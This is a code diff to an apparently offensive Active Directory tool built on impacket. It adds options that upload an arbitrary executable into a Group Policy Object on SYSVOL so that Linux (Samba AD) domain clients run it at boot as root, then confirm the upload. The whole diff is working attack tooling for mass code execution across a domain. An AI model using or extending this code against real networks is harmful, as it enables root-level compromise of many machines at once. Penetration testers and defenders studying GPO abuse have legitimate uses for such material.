@@ -14,6 +14,7 @@ import sys
 
 from impacket.smbconnection import SMBConnection
 from impacket.examples.utils import parse_credentials
+from pygpoabuse.linux_startup import LinuxStartupAbuse
 
 from pygpoabuse import logger
 from pygpoabuse.gpo import GPO
@@ -40,6 +41,13 @@ parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LD
 parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
 parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
 parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
+
+linux = parser.add_argument_group("Linux (Samba AD) options")
+linux.add_argument("--linux-exec", metavar="/PATH/TO/EXEC",
+                   help="Upload this executable into the GPO and run it at boot on Linux clients (no shell).")
+linux.add_argument("--linux-args", default="", help="Arguments for the executable.")
+linux.add_argument("--linux-run-as", default="root", help="User to run as (default: root).")
+
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -119,6 +127,31 @@ except Exception as e:
 
 try:
     gpo = GPO(smb_session)
+
+    if options.linux_exec:
+        method = LinuxStartupAbuse(
+            smb_session=smb_session,
+            domain_fqdn=domain,
+            gpo_guid=options.gpo_id,
+            exec_local_path=options.linux_exec,
+            exec_args=options.linux_args,
+            run_as=options.linux_run_as,
+            run_once=True
+        )
+        method.run(cleanup=options.cleanup)
+
+        try:
+            files = smb_session.listPath("SYSVOL", method._startup_dir + "\\*")
+            if any(f.get_longname() == method.script_name for f in files):
+                print("[+] SUCCESS:root:executable '{}' created in {}".format(
+                    method.script_name, method._startup_dir))
+            else:
+                logging.error("Upload failed: '{}' not found in {}".format(
+                    method.script_name, method._startup_dir))
+        except Exception as e:
+            logging.error("Could not verify creation: {}".format(e))
+
+        sys.exit(0)
 
     if options.cleanup:
         ok = gpo.rollback_scheduled_task(
